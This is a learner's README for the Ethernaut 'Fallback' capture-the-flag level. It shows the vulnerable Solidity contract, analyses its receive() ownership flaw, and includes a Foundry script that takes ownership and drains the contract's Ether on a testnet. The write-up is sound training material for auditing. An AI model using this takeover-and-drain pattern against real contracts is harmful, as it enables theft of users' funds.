# Ethernaut Level: Fallback - Smart Contract Auditing Journey

## Introduction
Hello! In this repository, I've solved the **Fallback** level as part of my Ethernaut challenges. I'm learning smart contract auditing by solving one level per day, and this folder (`levels/fallback/`) contains everything related to it.

**Goal:** Become the owner of the contract and withdraw all the Ether from it.  
**Tools:** Foundry (for scripting and testing), Sepolia testnet.  
**Solved Date:** October 19, 2025 (Day 3).  
**Success:** Verified on the Ethernaut site!

## Contract Overview
This contract simulates a "King of the Hill" game where users contribute ETH to become the owner. The owner starts with a virtual 1000 ETH contribution. Users can contribute small amounts (< 0.001 ETH) via `contribute()`, and if their total exceeds the current owner's, they take ownership. There's also a `receive()` function that triggers on direct ETH sends, allowing ownership change if the sender has contributed before. The owner can withdraw all funds via `withdraw()`.

**Key Code Snippet (from src/Fallback.sol):**
```solidity
contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

## Vulnerability Analysis
**Main Issue: Unprotected Fallback Function (Receive Hook Exploitation)**  
- The `receive()` function allows direct ETH transfers to change ownership without calling `contribute()`, as long as the sender has a prior contribution >0. This bypasses the <0.001 ETH limit in `contribute()`, enabling ownership takeover with a small send after initial contribution.  
- **Security Impact:** In audits, unchecked fallback/receive functions can lead to unauthorized state changes or reentrancy. Here, it allows draining funds by becoming owner illicitly. This teaches the dangers of payable fallbacks without proper guards.  
- **Audit Tip:** Always scrutinize payable functions for unintended triggers (e.g., via `call{value: }("")`). Use checks-effects-interactions pattern and limit fallback usage; prefer explicit functions for ETH handling.

**Example:** After contributing 0.0001 ETH (to set contributions >0), sending another 0.0001 ETH directly triggers `receive()`, setting owner without exceeding the contribute limit.

## Solution Steps
The attack: First, contribute a tiny amount to establish a contribution >0. Then, send ETH directly to trigger `receive()` and become owner (bypassing contribute's value limit). Finally, withdraw the balance.

1. **Setup:** Create Foundry project, set target instance address in script.
2. **Run Attack:** `forge script script/FallbackSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast`.
3. **Verify:** Check new owner and empty balance, submit on Ethernaut site.

**Key Attack Code Snippet (from script/FallbackSolution.s.sol):**
```solidity
contract FallbackSolution is Script {
    Fallback public fallbackInstance = Fallback(payable(<contractAddressHere>));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fallbackInstance.contribute{value: 0.0001 ether}();  // Establish contribution >0
        
        (bool success,) = address(fallbackInstance).call{value: 0.0001 ether}("");  // Trigger receive()
        require(success, "Fallback call failed");

        console.log("Owner:", fallbackInstance.owner());
        console.log("Address:", vm.envAddress("MY_ADDRESS"));

        fallbackInstance.withdraw();  // Drain funds as new owner
        vm.stopBroadcast();
    }
}
```

## Test and Output
- **Local Test:** Run `anvil` and `forge test`—simulates contribution, receive trigger, ownership change, and withdrawal.
- **Testnet Output Example:** Console log: `Owner: 0xYourAddress` (matches MY_ADDRESS). Balance transferred successfully.

## Key Learnings
- **Auditing Skill:** Review all payable entry points (constructor, functions, fallback/receive) for ownership or fund risks—tools like Slither can detect unsafe receives.
- **EVM Concept:** `receive()` triggers on direct ETH sends without data; use low-level `call{value: }("")` to invoke it. Contributions are in wei, so small values suffice.
- **Prevention:** Add reentrancy guards (e.g., OpenZeppelin's ReentrancyGuard) and explicit checks in fallbacks. Limit ownership changes to trusted mechanisms.
- **Next Step:** Modify the script to check contract balance before/after withdrawal for verification.

## Installation & Run
1. Install Foundry: `curl -L https://foundry.paradigm.xyz | bash`.
2. `cd levels/fallback`.
3. Set `.env`: `PRIVATE_KEY=your_key` and `SEPOLIA_RPC_URL=your_rpc`.
4. Run script: `forge script script/FallbackSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv`.

If you have questions, comment on the issue or mention me on X (@0xZHD_X)! 
Next level: `Fallout`. 🚀

---

- **License:** MIT  
- **Author:** [0xZHD] - Smart Contract Auditor Learner  
- **X:** [Zahedul I Sadik](@0xZHD_X)  
- **References:** [Ethernaut Docs](https://ethernaut.openzeppelin.com/)